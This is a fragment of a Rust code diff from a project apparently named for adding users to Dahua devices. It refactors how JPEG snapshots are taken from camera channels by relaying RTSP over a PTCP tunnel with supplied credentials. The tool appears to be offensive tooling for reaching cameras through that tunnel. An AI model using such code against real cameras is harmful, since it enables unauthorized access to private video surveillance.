-                            ch, label, local_port, rport
-                        );
-                    }
-                    let client_user = ruser.clone();
-                    let client_pass = rpass.clone();
-                    let ch_num = *ch as u16;
-                    let client = tokio::spawn(async move {
-                        dahua_dhip_adduser::rtsp::capture_snapshot(
-                            "127.0.0.1",
-                            local_port,
-                            ch_num,
-                            &client_user,
-                            &client_pass,
-                            probe_timeout,
-                        )
-                        .await
-                    });
-                    let accepted = tokio::time::timeout(probe_timeout, listener.accept()).await;
-                    let jpeg = match accepted {
-                        Ok(Ok((stream, _))) => {
-                            rtsp_forward_realm(sock, pcp_session, realm, stream, probe_timeout)
-                                .await;
-                            let _ = ptcp_disconnect_quick(sock, pcp_session, realm).await;
-                            client.await.unwrap_or(None)
-                        }
-                        _ => {
-                            if args.verbose {
-                                eprintln!(
-                                    "  [debug] ch{} {} RTSP relay: no local client connected",
-                                    ch, label
-                                );
-                            }
-                            let _ = ptcp_disconnect_quick(sock, pcp_session, realm).await;
-                            client.await.unwrap_or(None)
-                        }
-                    };
-                    if let Some(jp) = jpeg {
-                        if args.verbose {
-                            eprintln!(
-                                "  [debug] ch{} OK: {} RTSP-over-tunnel port {}",
-                                ch, label, rport
-                            );
-                        }
-                        body = Some(jp);
-                        break 'rtsp_tunnel;
-                    } else if args.verbose {
-                        eprintln!(
-                            "  [debug] ch{} {} RTSP-over-tunnel port {} failed",
-                            ch, label, rport
-                        );
-                    }
-                }
-            }
-            if body.is_none() && args.verbose {
-                eprintln!("  [debug] ch{} all RTSP-over-tunnel attempts failed", ch);
+            ]
+            .into_iter()
+            .collect();
+            if let Some(jp) = grab_rtsp_tunnel(
+                sock,
+                pcp_session,
+                &rtsp_creds,
+                rtsp_port,
+                *ch,
+                probe_timeout,
+                args.verbose,
+            )
+            .await
+            {
+                body = Some(jp);
             }
         }
 
@@ -4398,7 +4761,7 @@ async fn http_establish_session(
     args: &Args,
 ) -> Result<(u32, String), String> {
     let bind_timeout = args.timeout_or(15);
-    let realm_id = ptcp_bind(sock, pcp_session, port, bind_timeout)
+    let realm_id = ptcp_bind_retry(sock, pcp_session, port, bind_timeout, args.verbose)
         .await
         .ok_or_else(|| format!("PTCP bind failed on port {}", port))?;
 
